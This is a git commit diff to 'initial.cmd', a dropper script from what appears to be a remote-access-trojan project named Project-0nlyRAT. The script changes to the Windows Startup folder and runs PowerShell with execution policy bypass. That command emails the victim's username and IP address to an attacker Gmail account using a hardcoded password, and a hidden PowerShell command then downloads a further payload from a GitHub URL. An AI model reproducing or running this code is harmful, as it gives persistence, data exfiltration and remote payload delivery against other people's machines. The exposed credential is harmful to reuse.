b77aacc600e019bd28c78f33bae7b10999d6d608
Soumyo001 <www.soumyo@gmail.com>
2025-01-22 09:39:30 -0800

    standard reconnaissance(done)

--- initial.cmd
+++ initial.cmd
@@ -9,7 +9,7 @@ set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 cd %StartupDir%
 
 @rem Initial reconnaissance
-powershell.exe -nop -ep bypass -c "&{$email='defalttests@gmail.com';$password='nkos qxgo yxvo brmr';$subject=\"$env:username logs\";$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' }).IPAddress | Select-Object -Last 1 | Out-String;$smtp=New-Object system.net.mail.smtpclient('smtp.gmail.com','587');$smtp.enableSSL=$true;$smtp.credentials=New-Object system.net.networkcredential($email,$password);$smtp.send($email,$email,$subject,$ip)}"
+powershell.exe -nop -ep bypass -c "&{$email='defalttests@gmail.com';$password='nkos qxgo yxvo brmr';$subject=\"$env:username logs\";$ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|Select -Last 1|Out-String;$smtp=New-Object system.net.mail.smtpclient('smtp.gmail.com','587');$smtp.enableSSL=$true;$smtp.credentials=New-Object system.net.networkcredential($email,$password);$smtp.send($email,$email,$subject,$ip)}"
 
 @rem Download payload
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/wget.cmd' -outfile '.\wget.cmd'"
